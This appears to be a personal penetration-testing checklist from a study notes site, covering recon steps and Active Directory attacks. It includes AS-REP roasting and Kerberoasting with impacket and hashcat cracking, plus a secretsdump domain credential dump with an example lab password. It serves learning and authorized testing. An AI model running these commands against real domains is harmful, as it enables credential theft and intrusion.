---
sidebar_position: 1
---

## 1. Run begin.sh (basically autorecon)
<details>
While running, consider checking out HTTP ports. Document the general purpose of the site and any user flows. Do <a href="./general/Connecting">anonymous login</a> for any main services identified also.

If AD detected:

- Check for AS-REP roasting
<details>
Run `impacket-GetNPUsers -dc-ip <domain controller ip>  -request -outputfile hashes.asreproast <domain>/<user>` (eg `impacket-GetNPUsers -dc-ip <domain controller ip> -request -outputfile hashes.asreproast corp.com/<user>`). Then run `hashcat --help | grep -i "Kerberos"` and find the AS-REP mode for hashcat (it should be 18200, if not change the mode in the next command), then run `sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
</details>

- Check for Kerberoasting (Requires user and plaintext password)
<details>
`sudo impacket-GetUserSPNs -request -dc-ip <domain controller ip> <domain>/<user>` then `sudo hashcat -m 13100 <hash file> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
</details>

- [Not sure if should add to procedure cus depends on factor which might be v rare] Check for Domain Backup Abuse (Requires user and plaintext password)
<details>
`impacket-secretsdump -just-dc-user <target user> <domain>/<user w perms>:<password>@<ip**>**` (eg `impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70`)
</details>
</details>

## 2. After nmap full port scan is done
<details>
List down all ports and prioritise which to look thru first.
 
Add to to-do:
- <a href="./general/Connecting">anonymous login</a> for any known services
- investigate unknown ports 

Look thru full nmap scan for any definitive versions and add that to software/versions list.
</details>

## 3. After everything is done
<details>
- Check feroxbuster for HTTP ports
- Check patterns for any new identified software or CVEs
</details>

If found:

- NTLM hash: refer to [NTLM](/docs/procedure/NTLM)
- [AD](/docs/general/AD#enumeration)

